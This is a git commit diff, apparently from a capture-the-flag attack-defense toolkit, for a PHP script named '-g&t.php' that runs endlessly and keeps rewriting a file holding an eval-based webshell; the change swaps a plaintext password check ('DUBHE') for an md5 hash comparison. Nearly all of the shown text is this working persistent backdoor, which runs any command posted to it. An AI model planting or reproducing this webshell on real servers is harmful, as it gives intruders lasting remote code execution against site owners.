42e8550a3c7645236eae09ad74bf21f2ba99c539
meraklbz <lbz2770828522@gmail.com>
2025-08-17 13:33:42 +0800

    init

--- -g&t.php
+++ -g&t.php
@@ -2,7 +2,7 @@
 ignore_user_abort(true);
 set_time_limit(0);
 $file = './-g&t.php';
-$code = "<?php if(\$_GET['pass']=='DUBHE'){@eval(\$_POST['cmd']);}?>";
+$code = "<?php if(md5(\$_GET['pass'])=='0d823a43429d77faecac004d2c77e8fe'){@eval(\$_POST['cmd']);}?>";
 while (1){
 	if (!file_exists($file)) {
 		file_put_contents($file,$code);
